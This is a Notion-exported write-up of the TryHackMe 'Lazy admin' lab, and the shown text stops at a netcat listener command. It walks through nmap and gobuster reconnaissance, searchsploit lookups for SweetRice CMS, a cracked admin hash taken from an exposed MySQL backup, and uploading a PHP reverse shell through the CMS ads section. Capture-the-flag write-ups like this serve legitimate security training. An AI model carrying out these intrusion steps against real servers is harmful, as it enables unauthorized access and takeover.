@@ -1,0 +1,754 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Lazy admin</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="784e8b35-47cf-4983-8caf-fa1d37b99687" class="page mono"><header><div class="page-header-icon undefined"><img class="icon" src="Lazy%20admin%203a075da758724f66983dbce4bde05710/efbb70493ba66dfbac4302c02ad8facf.jpeg"/></div><h1 class="page-title">Lazy admin</h1><table class="properties"><tbody><tr class="property-row property-row-select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesSelect"><path d="M7,13 C10.31348,13 13,10.31371 13,7 C13,3.68629 10.31348,1 7,1 C3.68652,1 1,3.68629 1,7 C1,10.31371 3.68652,13 7,13 Z M3.75098,5.32278 C3.64893,5.19142 3.74268,5 3.90869,5 L10.09131,5 C10.25732,5 10.35107,5.19142 10.24902,5.32278 L7.15771,9.29703 C7.07764,9.39998 6.92236,9.39998 6.84229,9.29703 L3.75098,5.32278 Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-purple">Completed</span></td></tr><tr class="property-row property-row-date"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesDate"><path d="M10.8889,5.5 L3.11111,5.5 L3.11111,7.05556 L10.8889,7.05556 L10.8889,5.5 Z M12.4444,1.05556 L11.6667,1.05556 L11.6667,0 L10.1111,0 L10.1111,1.05556 L3.88889,1.05556 L3.88889,0 L2.33333,0 L2.33333,1.05556 L1.55556,1.05556 C0.692222,1.05556 0.00777777,1.75556 0.00777777,2.61111 L0,12.5 C0,13.3556 0.692222,14 1.55556,14 L12.4444,14 C13.3,14 14,13.3556 14,12.5 L14,2.61111 C14,1.75556 13.3,1.05556 12.4444,1.05556 Z M12.4444,12.5 L1.55556,12.5 L1.55556,3.94444 L12.4444,3.94444 L12.4444,12.5 Z M8.55556,8.61111 L3.11111,8.61111 L3.11111,10.1667 L8.55556,10.1667 L8.55556,8.61111 Z"></path></svg></span>Completed</th><td><time>@August 18, 2022</time></td></tr><tr class="property-row property-row-url"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesUrl"><path d="M3.73333,3.86667 L7.46667,3.86667 C8.49613,3.86667 9.33333,4.70387 9.33333,5.73333 C9.33333,6.7628 8.49613,7.6 7.46667,7.6 L6.53333,7.6 C6.01813,7.6 5.6,8.0186 5.6,8.53333 C5.6,9.04807 6.01813,9.46667 6.53333,9.46667 L7.46667,9.46667 C9.5284,9.46667 11.2,7.79507 11.2,5.73333 C11.2,3.6716 9.5284,2 7.46667,2 L3.73333,2 C1.6716,2 0,3.6716 0,5.73333 C0,7.124 0.762067,8.33453 1.88953,8.97713 C1.87553,8.83107 1.86667,8.6836 1.86667,8.53333 C1.86667,7.92013 1.98753,7.33447 2.2036,6.7978 C1.99267,6.4954 1.86667,6.12953 1.86667,5.73333 C1.86667,4.70387 2.70387,3.86667 3.73333,3.86667 Z M12.1095,5.28907 C12.1231,5.4356 12.1333,5.58307 12.1333,5.73333 C12.1333,6.34607 12.0101,6.9294 11.7931,7.46513 C12.0059,7.768 12.1333,8.13573 12.1333,8.53333 C12.1333,9.5628 11.2961,10.4 10.2667,10.4 L6.53333,10.4 C5.50387,10.4 4.66667,9.5628 4.66667,8.53333 C4.66667,7.50387 5.50387,6.66667 6.53333,6.66667 L7.46667,6.66667 C7.98187,6.66667 8.4,6.24807 8.4,5.73333 C8.4,5.2186 7.98187,4.8 7.46667,4.8 L6.53333,4.8 C4.4716,4.8 2.8,6.4716 2.8,8.53333 C2.8,10.59507 4.4716,12.2667 6.53333,12.2667 L10.2667,12.2667 C12.3284,12.2667 14,10.59507 14,8.53333 C14,7.14267 13.2375,5.93167 12.1095,5.28907 Z"></path></svg></span>Link</th><td><a href="https://tryhackme.com/room/lazyadmin " class="url-value">https://tryhackme.com/room/lazyadmin </a></td></tr></tbody></table></header><div class="page-body"><p id="5675bf52-6ad9-4736-85a3-b6a1bf31eafa" class="">Started with nmap and got some result like this </p><pre id="682b7c53-f30c-4f38-8618-39f0c9553474" class="code"><code>[selenophilem7@Tadashi]-[~/Documents/Hacking/TryHackMe/LazyAdmin]
+&gt;&gt;&gt; nmap -sC -sV lazyadmin.thm -oN nmap/initial 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-17 08:06 +0545
+Nmap scan report for lazyadmin.thm (10.10.220.46)
+Host is up (0.31s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
+|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
+|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 130.86 seconds</code></pre><p id="fb4d3f65-7d8c-4756-8647-6aa643f61ba0" class="">Ok after running go buster 2 time we got some grate results </p><p id="977c973a-4832-45a9-96eb-1ec957bea1ce" class="">Firstly on the lazyadmin.thm this url note I already mentioned in the hosts about the url then </p><p id="c9d1f9ab-5c39-4638-a7a0-ff6b63ef0755" class="">I got a content directory and then on lazyadmin.thm/content directory</p><pre id="ba2aef15-cfd4-4117-bd2a-ceb08a9e9326" class="code"><code>$ gobuster dir -u http://lazyadmin.thm/ -w /usr/share/wordlists/dirb/directory-list-2.3-medium.txt  -x php,txt,jpg,cgi,py  -o gobuster/initial
+$ gobuster dir -u http://lazyadmin.thm/content -w /usr/share/wordlists/dirb/directory-list-2.3-medium.txt  -x php,txt,jpg,cgi,py  -o gobuster/second</code></pre><figure id="3a075da7-5872-4f66-983d-bce4bde05710" class="image"><a href="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled.png"><img style="width:1366px" src="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled.png"/></a></figure><p id="f2b51f33-6b39-43a6-a4f5-c742a7921d45" class="">In <a href="http://lazyadmin.thm/content//changelog.txt">http://lazyadmin.thm/content//changelog.txt</a> here  I found the version used on cms.</p><figure id="c04d34e5-c339-4f2e-b20e-6b14f0c61fc2" class="image"><a href="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%201.png"><img style="width:1366px" src="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%201.png"/></a></figure><pre id="bec240ce-7413-4be3-8380-553ba6f04cec" class="code code-wrap"><code>#############################################
+SweetRice - Simple Website Management System
+Version 1.5.0
+Author:Hiler Liu steelcal@gmail.com
+Home page:http://www.basic-cms.org/
+#############################################</code></pre><p id="aeca6809-43ad-48a3-b189-42c95f3bc8b4" class="">And then I used serachsploit to find about the version of sweetrice and already known vulnerability</p><pre id="ca5ed07d-2d46-4be4-a2da-41c7b0edb942" class="code"><code>[selenophilem7@Tadashi]-[~/Documents/Hacking/TryHackMe/LazyAdmin/gobuster]
+&gt;&gt;&gt; searchsploit sweet rice
+---------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                      |  Path
+---------------------------------------------------------------------------------------------------- ---------------------------------
+SweetRice 0.5.3 - Remote File Inclusion                                                             | php/webapps/10246.txt
+SweetRice 0.6.7 - Multiple Vulnerabilities                                                          | php/webapps/15413.txt
+SweetRice 1.5.1 - Arbitrary File Download                                                           | php/webapps/40698.py
+SweetRice 1.5.1 - Arbitrary File Upload                                                             | php/webapps/40716.py
+SweetRice 1.5.1 - Backup Disclosure                                                                 | php/webapps/40718.txt
+SweetRice 1.5.1 - Cross-Site Request Forgery                                                        | php/webapps/40692.html
+SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                   | php/webapps/40700.html
+SweetRice &lt; 0.6.4 - &#x27;FCKeditor&#x27; Arbitrary File Upload                                               | php/webapps/14184.txt
+---------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+[selenophilem7@Tadashi]-[~/Documents/Hacking/TryHackMe/LazyAdmin/gobuster]
+&gt;&gt;&gt;</code></pre><p id="91d61447-eb5f-4038-823b-feeef3fc845f" class="">Got this type of  result and now looking the vulnerability on higher version. i.e. 1.5.1</p><p id="c2f70407-8a8a-48a9-b320-c3c6ab5f33be" class="">Ok Gobuster did a great job it figured out 2 more cool directories which pulled my eyes one of them is as and another is inc.</p><p id="f5174ae2-733a-47d0-8725-4fbbbabb40a8" class="">In the as directory we can find out login page and in inc directory we got latest.txt which says 1.5.1</p><p id="19660d37-0fbc-4a3b-804c-f751cf910035" class="">which means it is talking about the latest version and we already assumed this one and the another thing is my sql backup where we got our id and password.</p><p id="ad3ad298-24f1-4fe0-8b11-6c47ee2eccc5" class="">
+</p><pre id="73e16fa3-c632-4f7f-aa02-a6309752b47d" class="code"><code>#Important links
+http://lazyadmin.thm/content/as/
+http://lazyadmin.thm/content/inc/
+http://lazyadmin.thm/content/inc/lastest.txt
+http://lazyadmin.thm/content/inc/mysql_backup/</code></pre><p id="3c1c78bd-6794-4990-91de-51ff3b8efa60" class="">ok that mysql_backup has credentials so lets just open and read that </p><figure id="06751c3b-f392-4e78-932d-d155aa902d2e" class="image"><a href="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%202.png"><img style="width:1366px" src="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%202.png"/></a></figure><p id="f5527360-14ad-4a16-8a43-f8ce8bd15c6b" class="">After decoding this we got the password and we already know that username is admin</p><pre id="54b0aa66-0424-41f5-a152-a9d5dab26961" class="code"><code>42f749ade7f9e195bf475f37a44cafcb</code></pre><p id="e74b9319-6865-49cb-b259-b615f5dd64db" class="">I used crackstation website to crack it .</p><p id="776d4ab9-8338-4459-994a-4604c7ce3aa2" class="">After reading few files that I got from searchsploit that I have to upload a revershell so I copied the reverse shell </p><pre id="0db5dd2e-3905-4e9d-b713-8d6085dcedf2" class="code"><code>$ cp /usr/share/webshells/php/php-reverse-shell.php .
+</code></pre><p id="ae661eac-66b5-4b35-82d2-e9ba1079172c" class="">Then edited the php file </p><pre id="aec746fb-a621-4191-96d0-9e1c3dea8a6b" class="code"><code>$ nano php-reverse-shell.php</code></pre><figure id="ff9dd29f-708e-48ba-9def-b31c0bec6612" class="image"><a href="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%203.png"><img style="width:1366px" src="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%203.png"/></a></figure><p id="5bfd1c90-4acf-4c86-9ec7-9fe160e52411" class="">like this one change the IP according to you tun0</p><p id="15bd966d-aac1-425b-8f53-3eef4bba7873" class="">Then I open with this file with text editor  just to copy the code easily.</p><p id="3f441d5f-5c76-4dd0-90c3-c38fa1eda17e" class="">And pasted in the ads section </p><figure id="ba9699cd-1f5e-4171-b2b2-e61a118f8f1f" class="image"><a href="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%204.png"><img style="width:1366px" src="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%204.png"/></a></figure><p id="f2d1e9ec-9430-445b-89c7-98c9b98f4d5f" class="">Then I again visited /inc  </p><figure id="c20c1a30-9d6e-4f57-9b67-9c779bbdca84" class="image"><a href="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%205.png"><img style="width:1366px" src="Lazy%20admin%203a075da758724f66983dbce4bde05710/Untitled%205.png"/></a></figure><p id="f223909e-1502-4808-abc0-90b3a60b8fb8" class="">Here we found new directory named ads where we got the reverse-shell.php code</p><p id="81425a1e-1f02-4385-8b7a-a359e83e9903" class="">Started listener  with netcat .</p><pre id="af2f73a5-17bb-489e-806a-dd4c8e5e2b80" class="code"><code>$ nc -lvnp 1337
